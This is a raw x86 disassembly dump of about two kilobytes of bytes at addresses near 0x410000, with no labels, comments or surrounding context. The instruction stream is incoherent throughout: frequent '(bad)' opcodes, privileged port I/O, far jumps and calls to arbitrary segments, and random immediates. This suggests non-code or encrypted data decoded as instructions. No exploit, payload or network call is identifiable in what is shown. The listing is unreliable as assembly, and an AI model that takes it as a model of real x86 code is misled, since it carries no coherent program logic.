  4109e9:	sahf   
  4109ea:	inc    ebx
  4109eb:	adc    esp,DWORD PTR [esi-0x70]
  4109ee:	xor    eax,0x2c83a784
  4109f3:	(bad)  
  4109f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109f5:	cmp    DWORD PTR ds:0x282c8c53,edx
  4109fb:	push   ss
  4109fc:	loope  0x4109ea
  4109fe:	cmp    bl,ah
  410a00:	in     eax,0xb8
  410a02:	xor    eax,0xb2ad15f1
  410a07:	pusha  
  410a08:	call   0x5cd:0xa0887e56
  410a0f:	idiv   DWORD PTR [ecx]
  410a11:	add    eax,DWORD PTR [ecx]
  410a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a14:	xchg   ebx,eax
  410a15:	sbb    bh,BYTE PTR [ecx-0x662d1997]
  410a1b:	loop   0x4109b2
  410a1d:	mov    ecx,0x9fb95117
  410a22:	icebp  
  410a23:	dec    ebp
  410a24:	scas   al,BYTE PTR es:[edi]
  410a25:	loop   0x410a43
  410a27:	xor    bh,BYTE PTR [ecx-0x67]
  410a2a:	mov    dl,ah
  410a2c:	ins    DWORD PTR es:[edi],dx
  410a2d:	mov    WORD PTR [ecx],ds
  410a2f:	jmp    0xa2bb:0xd68db9b6
  410a36:	paddsb mm2,QWORD PTR [eax+0x7c5a6e04]
  410a3d:	mov    ebp,0xa19e5b3
  410a42:	fnstenv [ecx-0x71]
  410a45:	aam    0xc1
  410a47:	int    0x83
  410a49:	(bad)  fs:[ebx]
  410a4c:	nop
  410a4d:	test   DWORD PTR [edi],0x9e988f49
  410a53:	(bad)  
  410a54:	and    edx,esp
  410a56:	pop    ebp
  410a57:	and    DWORD PTR [ecx],esp
  410a59:	scas   al,BYTE PTR es:[edi]
  410a5a:	mov    eax,ds:0x83172f75
  410a5f:	mov    bh,0x52
  410a61:	imul   ecx,DWORD PTR [eax-0x52],0x52835010
  410a68:	mov    ?,WORD PTR [edx-0x11e1c28]
  410a6e:	clc    
  410a6f:	jmp    0xea0f:0x7702989
  410a76:	jmp    0x410a84
  410a78:	fucomi st,st(6)
  410a7a:	fwait
  410a7b:	xchg   esi,eax
  410a7c:	sub    esp,esp
  410a7e:	(bad)  
  410a7f:	jmp    0x58a1:0x5bbf77b3
  410a86:	add    al,0xa6
  410a88:	pop    ecx
  410a89:	or     BYTE PTR [ebx],0x16
  410a8c:	adc    eax,0x470d19fa
  410a91:	out    dx,al
  410a92:	test   DWORD PTR [edi-0x19e15c1d],edi
  410a98:	and    al,0xb2
  410a9a:	js     0x410afb
  410a9c:	xchg   edi,eax
  410a9d:	jl     0x410aa3
  410a9f:	fdivr  st(7),st
  410aa1:	mov    ebp,0x6566e1f8
  410aa6:	xchg   edi,eax
  410aa7:	cmp    esp,edx
  410aa9:	xchg   DWORD PTR [ebx+0x72],esi
  410aac:	arpl   WORD PTR [eax-0x2e],bx
  410aaf:	stos   BYTE PTR es:[edi],al
  410ab0:	adc    BYTE PTR [ebp+0x2f],bh
  410ab3:	js     0xc36754bd
  410ab9:	stos   DWORD PTR es:[edi],eax
  410aba:	jnp    0x410a79
  410abc:	jp     0x410a41
  410abe:	pop    esi
  410abf:	data16 sub BYTE PTR [edi],ah
  410ac2:	loope  0x410b31
  410ac4:	fmul   st(1),st
  410ac6:	pop    es
  410ac7:	fwait
  410ac8:	cmp    eax,0xd9dcd2f1
  410acd:	sbb    al,bh
  410acf:	dec    eax
  410ad0:	sub    eax,0x247d3892
  410ad5:	sbb    bh,ah
  410ad7:	stc    
  410ad8:	mov    ch,0xb7
  410ada:	push   edi
  410adb:	push   es
  410adc:	aad    0x7d
  410ade:	and    DWORD PTR [esi-0x44],ecx
  410ae1:	cs das 
  410ae3:	fmul   st(2),st
  410ae5:	xchg   edi,eax
  410ae6:	add    BYTE PTR gs:[edx],bl
  410ae9:	ja     0x410b54
  410aeb:	into   
  410aec:	test   eax,0x17c99a75
  410af1:	scas   eax,DWORD PTR es:[edi]
  410af2:	or     eax,0x350f591f
  410af7:	leave  
  410af8:	ja     0x410ae3
  410afa:	rol    edx,1
  410afc:	lods   al,BYTE PTR ds:[esi]
  410afd:	cmp    edx,DWORD PTR [eax+edi*8-0x13]
  410b01:	jmp    0x6a1c2424
  410b06:	jg     0x410af5
  410b08:	mov    cl,0xec
  410b0a:	addr16 ret 
  410b0c:	popf   
  410b0d:	sbb    edx,DWORD PTR [edi]
  410b0f:	into   
  410b10:	je     0x410b91
  410b12:	mov    esi,0x808cb361
  410b17:	jp     0x410b5e
  410b19:	nop
  410b1a:	test   al,0x83
  410b1c:	and    bh,0xd0
  410b1f:	mov    ds:0x618de7cf,al
  410b24:	fild   WORD PTR [ecx+0x71]
  410b27:	pop    esi
  410b28:	cmp    BYTE PTR [ebx],0x62
  410b2b:	test   al,0x3f
  410b2d:	jo     0x410b5d
  410b2f:	pop    edi
  410b30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b31:	shr    ecx,1
  410b33:	mov    ds:0xc2b5a36a,al
  410b38:	cdq    
  410b39:	cli    
  410b3a:	mov    ds:0xc1ad1f08,eax
  410b3f:	dec    ebp
  410b40:	inc    esi
  410b41:	mov    esp,ecx
  410b43:	mov    edx,0xe9247d58
  410b48:	add    bl,BYTE PTR [eax-0x5e]
  410b4b:	mov    dl,0xef
  410b4d:	pop    es
  410b4e:	pusha  
  410b4f:	jg     0x410b0f
  410b51:	cmp    DWORD PTR [edx-0x6fd82c94],esp
  410b57:	(bad)  
  410b58:	sub    DWORD PTR [edi+0x545e8eb9],ebx
  410b5e:	push   edi
  410b5f:	out    dx,eax
  410b60:	sbb    esp,DWORD PTR [ebx]
  410b62:	lock fist WORD PTR [edx]
  410b65:	je     0x410b2b
  410b67:	mov    cl,ch
  410b69:	pop    edi
  410b6a:	shr    BYTE PTR [ebx-0x2bcc2afc],0x2c
  410b71:	push   edi
  410b72:	dec    esp
  410b73:	add    eax,0xec19219b
  410b78:	and    DWORD PTR [eax],ecx
  410b7a:	loop   0x410ba5
  410b7c:	sti    
  410b7d:	jmp    0x103f:0xe58e2a68
  410b84:	push   esi
  410b85:	in     al,0x66
  410b87:	sub    al,0x57
  410b89:	inc    ecx
  410b8a:	imul   eax,DWORD PTR [ebx],0x2dacf840
  410b90:	mov    eax,0xd809da1
  410b95:	aam    0x50
  410b97:	jl     0x410bec
  410b99:	fs mov bh,0x41
  410b9c:	and    DWORD PTR [ebx+0xa],0xa
  410ba0:	aam    0xf5
  410ba2:	cmc    
  410ba3:	frstor [esp+ebx*1]
  410ba6:	lods   al,BYTE PTR ds:[esi]
  410ba7:	sub    BYTE PTR [edx+0x41],cl
  410baa:	out    0x61,eax
  410bac:	pop    ecx
  410bad:	ja     0x410bf0
  410baf:	jnp    0x410bcf
  410bb1:	shl    BYTE PTR [esi-0x57],cl
  410bb4:	mov    WORD PTR [ecx],ds
  410bb6:	(bad)  
  410bb7:	lea    esp,[edi+0x1c93fc22]
  410bbd:	add    BYTE PTR [ebx-0x75c7bb87],0x9c
  410bc4:	outs   dx,DWORD PTR ds:[esi]
  410bc5:	xor    DWORD PTR [ebx-0x51],edi
  410bc8:	push   ss
  410bc9:	pop    ecx
  410bca:	ins    DWORD PTR es:[edi],dx
  410bcb:	xlat   BYTE PTR ds:[ebx]
  410bcc:	aam    0x2
  410bce:	pop    esi
  410bcf:	(bad)  
  410bd1:	ja     0x410be8
  410bd3:	jnp    0x410bd3
  410bd5:	iret   
  410bd6:	push   0xec6cf267
  410bdb:	mov    ebx,0xd171395e
  410be0:	das    
  410be1:	mov    al,0xbf
  410be3:	jb     0x410bf6
  410be5:	mov    bl,0xf4
  410be7:	xor    al,BYTE PTR [eax+edx*1+0xc]
  410beb:	cmp    DWORD PTR [edx-0x52],ebp
  410bee:	cmp    bh,BYTE PTR [ebx-0x78]
  410bf1:	ret    
  410bf2:	add    eax,0x3cc3821a
  410bf7:	xchg   ebx,eax
  410bf8:	scas   eax,DWORD PTR es:[edi]
  410bf9:	sub    al,0xbd
  410bfb:	cld    
  410bfc:	fld    DWORD PTR [edx+0x2bf6136b]
  410c02:	fmul   st,st(6)
  410c04:	mul    DWORD PTR [ebx+0x7527ab36]
  410c0a:	neg    BYTE PTR [esi]
  410c0c:	ret    
  410c0d:	popf   
  410c0e:	pop    edx
  410c0f:	(bad)  
  410c10:	jnp    0x410bfd
  410c12:	cld    
  410c13:	lock jnp 0x410c3f
  410c16:	ins    DWORD PTR es:[edi],dx
  410c17:	pop    ss
  410c18:	cmp    edx,edi
  410c1a:	(bad)  
  410c1b:	sbb    cl,BYTE PTR [esi+ebp*8-0x74]
  410c1f:	xlat   BYTE PTR ds:[ebx]
  410c20:	jno    0x410c76
  410c22:	adc    DWORD PTR [ecx],edi
  410c24:	and    edx,esp
  410c26:	loope  0x410c9f
  410c28:	mov    dl,0x1e
  410c2a:	out    dx,eax
  410c2b:	(bad)  
  410c2c:	sti    
  410c2d:	xlat   BYTE PTR ds:[ebx]
  410c2e:	pop    edi
  410c2f:	jo     0x410bf0
  410c31:	ins    BYTE PTR es:[edi],dx
  410c32:	sti    
  410c33:	cld    
  410c34:	lahf   
  410c35:	jnp    0x410c5a
  410c37:	or     DWORD PTR [ecx-0x3e],0x21
  410c3b:	pop    ds
  410c3c:	cmp    eax,DWORD PTR [ebp-0x47fec07f]
  410c42:	pop    es
  410c43:	es pop edx
  410c45:	fwait
  410c46:	aas    
  410c47:	xchg   esp,eax
  410c48:	call   0xb430:0xbcda2819
  410c4f:	jns    0x410c56
  410c51:	jl     0x410c03
  410c53:	dec    eax
  410c54:	jl     0x410cb4
  410c56:	xchg   esi,eax
  410c57:	xchg   ebp,eax
  410c58:	push   eax
  410c59:	jno    0x410c8c
  410c5b:	cmp    dl,dl
  410c5d:	sub    edx,esp
  410c5f:	fs and dl,ah
  410c62:	mov    ds:0x91b491fa,eax
  410c67:	cmp    eax,esi
  410c69:	ret    0x20f5
  410c6c:	fsub   QWORD PTR [ebp+ebx*2+0x1e88f6de]
  410c73:	ds out dx,eax
  410c75:	jmp    0xcf6042fa
  410c7a:	inc    ebp
  410c7b:	shr    DWORD PTR [edx],0xef
  410c7e:	int3   
  410c7f:	outs   dx,BYTE PTR ds:[esi]
  410c81:	clc    
  410c82:	mov    bh,0x73
  410c84:	outs   dx,BYTE PTR ds:[esi]
  410c85:	fst    QWORD PTR [ebx]
  410c87:	jne    0x410c7d
  410c89:	(bad)  
  410c8a:	lds    edx,FWORD PTR [esi+0x2]
  410c8d:	jle    0x410c80
  410c8f:	loopne 0x410c2f
  410c91:	pop    ds
  410c92:	xchg   edi,eax
  410c93:	stos   BYTE PTR es:[edi],al
  410c94:	inc    edx
  410c95:	inc    esp
  410c96:	sub    DWORD PTR [eax-0x2980c690],edx
  410c9c:	xchg   ecx,eax
  410c9d:	cs loopne 0x410ccb
  410ca0:	mov    ebx,0x65930aac
  410ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ca6:	mov    ecx,0x9b472c5f
  410cab:	push   es
  410cac:	xchg   esp,eax
  410cad:	fucom  st(4)
  410caf:	ss in  eax,0x83
  410cb2:	xor    al,dh
  410cb4:	pushf  
  410cb5:	add    edx,DWORD PTR [esp+edx*2]
  410cb8:	add    eax,0x44b03495
  410cbd:	xchg   BYTE PTR [eax-0x27d20753],ah
  410cc3:	mov    fs,WORD PTR [ecx]
  410cc5:	pushf  
  410cc6:	xchg   edi,eax
  410cc7:	jg     0x410d20
  410cc9:	call   0x9e57:0xc27a7404
  410cd0:	imul   ebx,DWORD PTR [esi+0x9fa3903],0x9
  410cd7:	jecxz  0x410c9c
  410cd9:	sbb    eax,0xeac28d68
  410cde:	add    DWORD PTR [esi+0x12043165],esp
  410ce4:	adc    esp,ecx
  410ce6:	jle    0x410d0f
  410ce8:	cmp    ebx,edi
  410cea:	gs iret 
  410cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ced:	jle    0x410cfa
  410cef:	out    0x2c,eax
  410cf1:	ds mov bl,0x14
  410cf4:	div    BYTE PTR [edi+0x5edeecbe]
  410cfa:	dec    esi
  410cfb:	and    eax,0x477082d5
  410d00:	dec    edi
  410d01:	inc    BYTE PTR [esi]
  410d03:	xor    bh,dh
  410d05:	in     al,0xfa
  410d07:	jb     0x410d7b
  410d09:	cmp    DWORD PTR [edx+esi*4+0x638e3780],eax
  410d10:	data16 aas 
  410d12:	stos   DWORD PTR es:[edi],eax
  410d13:	pusha  
  410d14:	icebp  
  410d15:	mov    ecx,0xa7dd7198
  410d1a:	pop    esp
  410d1b:	gs dec ecx
  410d1d:	add    eax,0xaa9b7cb3
  410d22:	jbe    0x410d6e
  410d24:	push   ss
  410d25:	mov    WORD PTR [ebx],cs
  410d27:	fmul   st(3),st
  410d29:	pop    ebx
  410d2a:	sub    al,0x20
  410d2c:	adc    BYTE PTR [ebx],dh
  410d2e:	push   ecx
  410d2f:	adc    al,0x51
  410d31:	rol    BYTE PTR [eax-0x2a],1
  410d34:	dec    ebx
  410d35:	sti    
  410d36:	jbe    0x410d5a
  410d38:	icebp  
  410d39:	fimul  DWORD PTR [ecx]
  410d3b:	xor    bh,BYTE PTR [eax+0x23fae9a6]
  410d41:	daa    
  410d42:	jnp    0x410cdb
  410d44:	aas    
  410d45:	ret    0x458c
  410d48:	jae    0x410d87
  410d4a:	jae    0x410dc8
  410d4c:	cmp    DWORD PTR [edi+0x7a9c12a9],edi
  410d52:	mov    esi,0x2e47bf1d
  410d57:	add    edi,DWORD PTR [edx+edx*1+0x38]
  410d5b:	sti    
  410d5c:	xor    al,0xe0
  410d5e:	xor    eax,0x1bf795b1
  410d63:	(bad)  
  410d64:	jg     0x410d79
  410d66:	jne    0x410d0d
  410d68:	xor    BYTE PTR [eax+0x21],ah
  410d6b:	or     ebp,DWORD PTR [esi]
  410d6d:	mov    edi,ecx
  410d6f:	jl     0xf27abdd7
  410d75:	push   ss
  410d76:	(bad)  
  410d77:	(bad)  
  410d78:	inc    esp
  410d79:	cmp    DWORD PTR [ebx],ebx
  410d7b:	imul   edi,DWORD PTR [ebx-0x5a7b24c0],0x6ffd7a6e
  410d85:	jnp    0x410db4
  410d87:	sti    
  410d88:	lea    eax,[eax-0x3372edf0]
  410d8e:	mov    ah,0x54
  410d90:	pop    ebx
  410d91:	mov    ah,BYTE PTR [esi]
  410d93:	stos   DWORD PTR es:[edi],eax
  410d94:	push   ss
  410d95:	enter  0xa916,0xa1
  410d99:	fisub  DWORD PTR [ecx-0x54]
  410d9c:	rcr    BYTE PTR [edi+0xd907570],0x5d
  410da3:	js     0x410d69
  410da5:	pop    eax
  410da6:	stos   BYTE PTR es:[edi],al
  410da7:	mov    esp,0xb1c11ed2
  410dac:	or     al,BYTE PTR [ecx]
  410dae:	popa   
  410daf:	fmul   DWORD PTR ds:0x3c9e873c
  410db5:	sub    al,0x52
  410db7:	or     esi,DWORD PTR [edi]
  410db9:	lds    ebx,FWORD PTR [ebx]
  410dbb:	retf   
  410dbc:	mov    al,0x36
  410dbe:	sbb    ecx,DWORD PTR [edi-0x4eff357]
  410dc4:	outs   dx,BYTE PTR ds:[esi]
  410dc5:	fisubr DWORD PTR [ecx+0x6]
  410dc8:	imul   ebp,DWORD PTR [ebx-0x6150070f],0xf68d816a
  410dd2:	jnp    0x410da5
  410dd4:	push   esp
  410dd5:	push   eax
  410dd6:	shr    DWORD PTR [ecx+0x44],0xb3
  410dda:	ins    BYTE PTR es:[edi],dx
  410ddb:	cmp    BYTE PTR [edi],cl
  410ddd:	inc    ecx
  410dde:	popf   
  410ddf:	mov    ch,0x72
  410de1:	add    BYTE PTR [ebx],al
  410de3:	(bad)  
  410de4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410de5:	repz bswap ecx
  410de8:	push   0xa53e044
  410ded:	pop    edx
  410dee:	sub    al,0x2a
  410df0:	mov    ds:0xe9cf61a0,al
  410df5:	inc    ecx
  410df6:	inc    ebx
  410df7:	jmp    0xa02f:0xd4a1d160
  410dfe:	les    esi,FWORD PTR [edx]
  410e00:	jp     0x410d97
  410e02:	push   esi
  410e03:	jmp    0x69f64033
  410e08:	or     eax,0xfe809e
  410e0d:	aaa    
  410e0e:	rol    BYTE PTR [ebp-0x1e],0x40
  410e12:	stc    
  410e13:	enter  0x5251,0x6e
  410e17:	mov    al,ds:0xc13218b4
  410e1c:	test   eax,0x3db28998
  410e21:	pop    edi
  410e22:	lock and eax,0xf215a784
  410e28:	adc    al,BYTE PTR [ebp-0x6]
  410e2b:	or     cl,BYTE PTR [eax+0x5c]
  410e2e:	push   edi
  410e2f:	rcr    dh,0x53
  410e32:	sti    
  410e33:	and    eax,0x12a87389
  410e38:	pop    edx
  410e39:	mov    ds:0x8bfa61d2,eax
  410e3e:	popf   
  410e3f:	cs xor bh,dl
  410e42:	add    BYTE PTR [edi+0x3bf0cd4b],bh
  410e48:	push   es
  410e49:	shl    BYTE PTR [edi-0x40],cl
  410e4c:	call   0xc110:0x24bf2d7f
  410e53:	dec    ebp
  410e54:	(bad)  
  410e55:	std    
  410e56:	enter  0xbb93,0x3a
  410e5a:	ins    DWORD PTR es:[edi],dx
  410e5b:	mov    esi,0xe3ff4e34
  410e60:	ret    
  410e61:	(bad)
  410e65:	add    eax,0x5ee01c72
  410e6a:	fnstsw WORD PTR [ebp+0x77]
  410e6d:	push   edx
  410e6e:	and    ebx,DWORD PTR [eax-0x33]
  410e71:	in     eax,dx
  410e72:	ret    
  410e73:	mov    ah,0x8d
  410e75:	loope  0x410ee4
  410e77:	fcomp  DWORD PTR [esi+eiz*1]
  410e7a:	mov    BYTE PTR [ebp-0x18],bh
  410e7d:	jae    0x410e93
  410e7f:	int3   
  410e80:	bound  edi,QWORD PTR [esi-0x5f3fb7a4]
  410e86:	lock sub eax,0xad3dd9f5
  410e8c:	sar    BYTE PTR [edx-0x3f],cl
  410e8f:	call   0x6d27:0xe921ef22
  410e96:	pop    esp
  410e97:	cli    
  410e98:	push   0x8206f6cc
  410e9d:	jl     0x410edd
  410e9f:	test   al,0x1d
  410ea1:	stos   BYTE PTR es:[edi],al
  410ea2:	(bad)  
  410ea3:	push   edx
  410ea4:	lods   eax,DWORD PTR ds:[esi]
  410ea5:	cmp    ch,ch
  410ea7:	adc    BYTE PTR [edx-0x24dbe024],cl
  410ead:	pop    eax
  410eae:	(bad)  [edi+0x24f38a34]
  410eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eb5:	repnz neg DWORD PTR [esi-0x5e]
  410eb9:	xchg   edx,eax
  410eba:	test   BYTE PTR ds:0x2a29a02f,cl
  410ec0:	test   DWORD PTR [eax-0x48819724],ebp
  410ec6:	int3   
  410ec7:	mov    al,0x55
  410ec9:	add    BYTE PTR [esi],dl
  410ecb:	pop    es
  410ecc:	cmc    
  410ecd:	jbe    0x410f4e
  410ecf:	mov    ebx,0xe12f547e
  410ed4:	add    bl,BYTE PTR [edx+esi*8-0x52f358cb]
  410edb:	xchg   ebp,eax
  410edc:	arpl   WORD PTR [edi],dx
  410ede:	mov    edx,es
  410ee0:	mov    edx,ss
  410ee2:	adc    DWORD PTR [edx],ebp
  410ee4:	xchg   edx,eax
  410ee5:	in     al,0x75
  410ee7:	call   0x5fc6:0xed2ef910
  410eee:	mov    BYTE PTR [ebx+0x60c2a80c],0x67
  410ef5:	jmp    0x23b:0x36e0096d
  410efc:	mov    esp,DWORD PTR [ebp-0x758f19bd]
  410f02:	ja     0x410f06
  410f04:	dec    edx
  410f05:	sub    bh,BYTE PTR [eax+0x7d1b52f5]
  410f0b:	pop    ebp
  410f0c:	dec    ebp
  410f0d:	dec    ecx
  410f0e:	and    BYTE PTR [ebx-0x7ce68378],bl
  410f14:	lock nop
  410f16:	adc    al,0xa4
  410f18:	cmp    al,0xbb
  410f1a:	out    0x71,al
  410f1c:	jb     0x410f82
  410f1e:	sbb    BYTE PTR [ecx],al
  410f20:	(bad)  
  410f22:	push   ds
  410f23:	dec    esi
  410f24:	add    DWORD PTR [esi-0x10],eax
  410f27:	add    edx,ebp
  410f29:	sub    eax,0x1399bb67
  410f2e:	pusha  
  410f2f:	mov    eax,ds:0x58fcb20d
  410f34:	lea    edx,[esi+0x5343c7d4]
  410f3a:	fmul   QWORD PTR [ebp-0x46f74fbd]
  410f40:	sbb    ch,BYTE PTR [edi-0x39771230]
  410f46:	dec    edx
  410f47:	add    DWORD PTR [ecx-0x49],0xffffffe1
  410f4b:	(bad)  [ecx]
  410f4d:	pusha  
  410f4e:	pop    esi
  410f4f:	mov    bl,0xd7
  410f51:	div    esi
  410f53:	ins    DWORD PTR es:[edi],dx
  410f54:	ss mov ebp,ds
  410f57:	repz mov ds:0x56b973ed,al
  410f5d:	mov    ch,0x9b
  410f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f60:	mov    ah,0x72
  410f62:	and    edi,edx
  410f64:	mov    ch,0xe1
  410f66:	dec    edx
  410f67:	aaa    
  410f68:	retf   
  410f69:	sbb    DWORD PTR [eax+0x5a85713e],ebx
  410f6f:	sbb    DWORD PTR [eax],edx
  410f71:	loope  0x410f2f
  410f73:	sbb    BYTE PTR ds:0xbafbe28b,dh
  410f79:	fcmovu st,st(0)
  410f7b:	lods   eax,DWORD PTR ds:[esi]
  410f7c:	ret    0x3b5d
  410f7f:	cmp    esp,DWORD PTR [esi+0x4d57c4ca]
  410f85:	mov    bl,0x8f
  410f87:	mov    eax,ds:0x7b6bb903
  410f8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f8d:	jge    0x410fbf
  410f8f:	ret    
  410f90:	(bad)  
  410f91:	retf   
  410f92:	add    esp,0xf6a8f8a0
  410f98:	jns    0x410f46
  410f9a:	fisub  DWORD PTR [esp+edx*1-0x221e5913]
  410fa1:	call   0x530:0xd61b99fb
  410fa8:	jnp    0x410fb7
  410faa:	xor    cl,BYTE PTR ds:0x53a11da3
  410fb0:	iret   
  410fb1:	sbb    cl,cl
  410fb3:	adc    esi,DWORD PTR [eax]
  410fb5:	scas   eax,DWORD PTR es:[edi]
  410fb6:	cmp    DWORD PTR [esi],0xe
  410fb9:	inc    esp
  410fba:	add    BYTE PTR [edi],ch
  410fbc:	mov    ebx,0x1cc9d92
  410fc1:	(bad)  
  410fc2:	fistp  QWORD PTR [ecx+esi*1]
  410fc5:	cmp    eax,0xfbdb8471
  410fca:	out    0xbf,eax
  410fcc:	retf   0x7103
  410fcf:	or     edi,DWORD PTR [eax+ebp*1-0x1acb9ba]
  410fd6:	pop    ds
  410fd7:	rcr    BYTE PTR ds:0x7c69a786,0xa7
  410fde:	mov    dh,0x2e
  410fe0:	retf   
  410fe1:	fs in  al,dx
  410fe3:	pop    ecx
  410fe4:	push   ss
  410fe5:	jb     0x410f9f
  410fe7:	(bad)  
  410fe8:	bound  edx,QWORD PTR [edi-0x460c9ca]
  410fee:	push   ds
  410fef:	retf   0x8728
  410ff2:	dec    edx
  410ff3:	repnz mov eax,0x14895382
  410ff9:	or     al,0x60
  410ffb:	adc    eax,0x6cd67bf6
  411000:	data16 fstp QWORD PTR [edi]
  411003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411004:	rcl    BYTE PTR [edx+0x5e],cl
  411007:	dec    edx
  411008:	mov    bh,0xe0
  41100a:	inc    edi
  41100b:	aam    0x4d
  41100d:	sbb    DWORD PTR [ebx],ebx
  41100f:	sub    BYTE PTR [eax+0x7befcbc8],bh
  411015:	icebp  
  411016:	inc    ecx
  411017:	cli    
  411018:	fsubr  QWORD PTR [ebp-0x2]
  41101b:	out    dx,al
  41101c:	mov    ebx,0x8fb6ab59
  411021:	push   ebp
  411022:	ss xor bh,ch
  411025:	xor    eax,0x57f14cdb
  41102a:	es mov dh,0x96
  41102d:	cwde   
  41102e:	out    0xed,eax
  411030:	mov    dh,0xac
  411032:	repz sub al,BYTE PTR [eax+ebx*4-0x36544c7a]
  41103a:	(bad)  
  41103b:	jns    0x411026
  41103d:	loope  0x41106f
  41103f:	aas    
  411040:	sub    al,0x1e
  411042:	out    0x49,eax
  411044:	cmp    ebp,ebx
  411046:	rcr    BYTE PTR [ecx-0x7],0xb6
  41104a:	(bad)  
  41104b:	fs retf 
  41104d:	xchg   ebp,eax
  41104e:	push   esi
  41104f:	fidivr DWORD PTR [edi-0x50eddefd]
  411055:	loop   0x41109e
  411057:	mov    eax,ds:0x1eede1e6
  41105c:	pop    edx
  41105d:	fs mov edx,0x5e6d83f8
  411063:	cmc    
  411064:	mov    eax,0x5b20c95d
  411069:	mov    DWORD PTR [edx+eiz*4-0x7ffe2bbc],esi
  411070:	xor    al,0x20
  411072:	add    esp,edx
  411074:	xchg   DWORD PTR [ecx+0x3c],eax
  411077:	iret   
  411078:	mov    ebx,0xae598961
  41107d:	jo     0x4110e1
  41107f:	pushf  
  411080:	rcr    DWORD PTR ds:0x643cd63,1
  411086:	popa   
  411087:	or     BYTE PTR [edx-0x58da509c],ah
  41108d:	mov    ds:0xa38322a6,eax
  411092:	sub    al,0x54
  411094:	aaa    
  411095:	xor    BYTE PTR [edx*4-0xe080237],dh
  41109c:	mov    al,0x7e
  41109e:	mov    al,ds:0x508069bf
  4110a3:	jne    0x411065
  4110a5:	inc    edi
  4110a6:	push   edx
  4110a7:	addr16 das 
  4110a9:	xor    al,BYTE PTR [ecx+0x4abbac78]
  4110af:	fst    QWORD PTR ds:0x26549d44
  4110b5:	in     al,dx
  4110b6:	cmp    BYTE PTR [esi+0x370b6f02],al
  4110bc:	frstor [ebx+0x2]
  4110bf:	adc    BYTE PTR [edx],bh
  4110c1:	stc    
  4110c2:	fisubr WORD PTR [edi-0x378ac3f1]
  4110c8:	push   0xffffffa9
  4110ca:	adc    ebx,DWORD PTR [edx+0x62]
  4110cd:	jmp    0x29d:0x61c77265
  4110d4:	cs mov eax,0x40ffc63e
  4110da:	mov    ch,BYTE PTR [esi+0xf]
  4110dd:	out    dx,eax
  4110de:	xor    esi,DWORD PTR [edx+0x45a54c1]
  4110e4:	loope  0x41115e
  4110e6:	jne    0x4110c8
  4110e8:	or     dh,BYTE PTR [ecx-0x10]
  4110eb:	aas    
  4110ec:	into   
  4110ed:	push   ebp
  4110ee:	int    0x8d
  4110f0:	call   FWORD PTR [ebx+0x6]
  4110f3:	mov    ah,BYTE PTR [ebp-0x7bc13c31]
  4110f9:	(bad)  
  4110fa:	cmp    BYTE PTR [ebx+0x73cfb3c],cl
  411100:	js     0x4110a5
  411102:	add    eax,DWORD PTR [edx-0xf052133]
  411108:	inc    ecx
  411109:	int3   
  41110a:	aam    0x7
  41110c:	xor    edx,DWORD PTR [di]
  41110f:	pop    ds
  411110:	icebp  
  411111:	mov    dl,0x55
  411113:	cdq    
  411114:	icebp  
  411115:	pop    esp
  411116:	xchg   edi,eax
  411117:	gs in  eax,0x59
  41111a:	pusha  
  41111b:	outs   dx,BYTE PTR ds:[esi]
  41111c:	xchg   edx,eax
  41111d:	dec    edx
  41111e:	call   0x5433af28
  411123:	in     eax,dx
  411124:	ret    
  411125:	dec    edx
  411126:	pushf  
  411127:	push   ebx
  411128:	clc    
  411129:	add    al,0x7c
  41112b:	inc    ecx
  41112c:	xor    eax,0xb216ed0c
  411131:	or     DWORD PTR [esp+ecx*2],eax
  411134:	pop    ds
  411135:	mov    esi,0x8541f6ee
  41113a:	inc    esp
  41113b:	ins    DWORD PTR es:[edi],dx
  41113c:	mov    ah,0x19
  41113e:	pop    ecx
  41113f:	xor    DWORD PTR [eax-0x3a],ebx
  411142:	imul   DWORD PTR ds:0xd66a0ae1
  411148:	out    0x91,eax
  41114a:	repz out 0xe,eax
  41114d:	ret    0x18a3
  411150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411151:	dec    ebp
  411152:	inc    ebp
  411153:	xchg   edx,eax
  411154:	dec    esp
  411155:	std    
  411156:	mov    cl,0xc0
  411158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411159:	pop    edx
  41115a:	push   0x27
  41115c:	(bad)  
  41115d:	std    
  41115e:	xor    DWORD PTR [esi],esi
  411160:	mov    eax,0xcd62e14f
  411165:	jmp    0x1bda9ad7
  41116a:	fsubr  DWORD PTR [edi+0x2fef1524]
  411170:	xor    BYTE PTR [edx+0x52acbffd],0x45
  411177:	mov    edi,0xc1f353ce
  41117c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41117d:	push   ds
  41117e:	mov    ds:0xe1e94217,eax
  411183:	stos   DWORD PTR es:[edi],eax
  411184:	lahf   
  411185:	add    BYTE PTR [eax],0x6a
  411188:	out    0xac,eax
  41118a:	jns    0x411121
  41118c:	dec    ebx
  41118d:	and    DWORD PTR [ebx+0x58],ebx
  411190:	jae    0x4111f8
  411192:	les    ebx,FWORD PTR [edx+edi*8-0x22a847b6]
  411199:	cld    
  41119a:	or     BYTE PTR [eax+0x21],0xd6
  41119e:	pop    ebp
  41119f:	outs   dx,DWORD PTR ds:[esi]
  4111a0:	inc    BYTE PTR [edx-0x5341a884]
  4111a6:	sub    eax,0x7701f843
  4111ab:	repz and ecx,esi
  4111ae:	test   DWORD PTR [ecx-0x2d931f75],ebp
  4111b4:	aas    
  4111b5:	je     0x411160
  4111b7:	(bad)
  4111bc:	xchg   ecx,eax
  4111bd:	or     bh,BYTE PTR ds:0xde65e503
  4111c3:	(bad)  
  4111c4:	hlt    
  4111c5:	sbb    ah,dl
  4111c7:	add    BYTE PTR [ebp-0x4c680dab],ch
  4111cd:	lock dec ecx
  4111cf:	cmp    al,0xc6
  4111d1:	popa   
  4111d2:	aam    0x28
  4111d4:	hlt    
  4111d5:	adc    esi,esp
  4111d7:	push   edx
  4111d8:	adc    ah,dh
